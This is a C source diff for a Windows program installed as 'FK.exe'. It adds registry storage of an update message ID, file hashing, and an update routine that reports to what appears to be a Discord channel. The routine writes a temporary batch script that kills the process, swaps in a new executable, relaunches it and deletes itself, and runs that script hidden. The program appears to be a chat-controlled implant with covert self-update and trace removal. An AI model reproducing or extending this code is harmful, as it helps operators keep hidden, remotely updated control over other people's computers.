@@ -137,6 +137,91 @@ static void get_install_dir(char* out, size_t size) {
     snprintf(out, size, "%s\\%s", base, INSTALL_PATH);
 }
 
+uint64_t get_installed_exe_msg_id(void) {
+    HKEY hKey;
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+        FEMBOY_KISSER_REG_PATH,
+        0,
+        KEY_READ,
+        &hKey) != ERROR_SUCCESS) {
+        return 0;
+    }
+
+    char id[64] = {0};
+    DWORD size = sizeof(id);
+
+    RegGetValueA(hKey, NULL, "InstalledExeMsgId", RRF_RT_REG_SZ, NULL, (BYTE*)id, &size);
+    RegCloseKey(hKey);
+
+    return strtoull(id, NULL, 10);
+}
+
+bool save_installed_exe_msg_id(uint64_t msg_id) {
+    HKEY hKey;
+
+    if (RegCreateKeyExA(
+        HKEY_CURRENT_USER,
+        FEMBOY_KISSER_REG_PATH,
+        0,
+        NULL,
+        0,
+        KEY_WRITE,
+        NULL,
+        &hKey,
+        NULL
+    ) != ERROR_SUCCESS) {
+        return false;
+    }
+
+    char id_str[64];
+    snprintf(id_str, sizeof(id_str), "%llu", (unsigned long long)msg_id);
+
+    LONG res = RegSetValueExA(
+        hKey,
+        "InstalledExeMsgId",
+        0,
+        REG_SZ,
+        (const BYTE*)id_str,
+        (DWORD)(strlen(id_str) + 1)
+    );
+
+    RegCloseKey(hKey);
+
+    return res == ERROR_SUCCESS;
+}
+
+uint64_t get_file_hash(const char* path) {
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+
+    uint64_t hash = 0;
+    char buffer[4096];
+    DWORD bytesRead;
+
+    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+        for (DWORD i = 0; i < bytesRead; i++) {
+            hash += (unsigned char)buffer[i];
+            hash *= 31;
+        }
+    }
+
+    CloseHandle(hFile);
+    return hash;
+}
+
+uint64_t get_installed_executable_hash(void) {
+    char install_dir[MAX_PATH];
+    get_install_dir(install_dir, sizeof(install_dir));
+
+    char exe_path[MAX_PATH];
+    snprintf(exe_path, sizeof(exe_path), "%s\\FK.exe", install_dir);
+
+    return get_file_hash(exe_path);
+}
+
 static int create_dir(const char* path) {
     return CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
 }
@@ -394,6 +479,61 @@ int uninstall(uint64_t confirm) {
     }
 
     delete_old_fk_dir();
+
+    return 0;
+}
+
+int update(const char* new_exe_path, const char* msg_id) {
+    if (get_file_hash(new_exe_path) == get_installed_executable_hash()) {
+        return 0;
+    }
+
+    printf("Updating to new executable: '%s'\n", new_exe_path);
+    char msg[1024];
+    snprintf(msg, sizeof(msg), "Update command received. Applying update from '%s'...", msg_id ? msg_id : "unknown source");
+    send_dc_msg(msg);
+
+    char install_dir[MAX_PATH];
+    char current_exe[MAX_PATH];
+    char bat_path[MAX_PATH];
+
+    get_install_dir(install_dir, sizeof(install_dir));
+    snprintf(current_exe, sizeof(current_exe), "%s\\FK.exe", install_dir);
+
+    char temp_dir[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_dir);
+
+    snprintf(bat_path, sizeof(bat_path), "%s\\fk_update_%llu.bat", 
+             temp_dir, (unsigned long long)GetTickCount64());
+
+    FILE* f = fopen(bat_path, "w");
+    if (!f) {
+        send_dc_msg("Update failed: Could not create batch file.");
+        return 1;
+    }
+
+    fprintf(f,
+        "@echo off\r\n"
+        "timeout /t 2 /nobreak >nul\r\n"                   // Wait for current process to exit
+        "taskkill /f /im FK.exe >nul 2>&1\r\n"             // Force kill current instance
+        "timeout /t 1 /nobreak >nul\r\n"
+        "copy /y \"%s\" \"%s\" >nul\r\n"                   // Copy new exe over old one
+        "if exist \"%s\" del /f /q \"%s\" >nul\r\n"        // Delete the downloaded update
+        "start \"\" \"%s\"\r\n"                            // Start new version
+        "del /f /q \"%s\" >nul 2>&1\r\n"                   // Delete batch itself
+        , new_exe_path, current_exe, new_exe_path, new_exe_path, current_exe, bat_path);
+
+    fclose(f);
+
+    if (msg_id) {
+        save_installed_exe_msg_id(strtoull(msg_id, NULL, 10));
+    }
+    
+    send_dc_msg("Applying update...");
+
+    ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);
+
+    ExitProcess(0);
 
     return 0;
 }
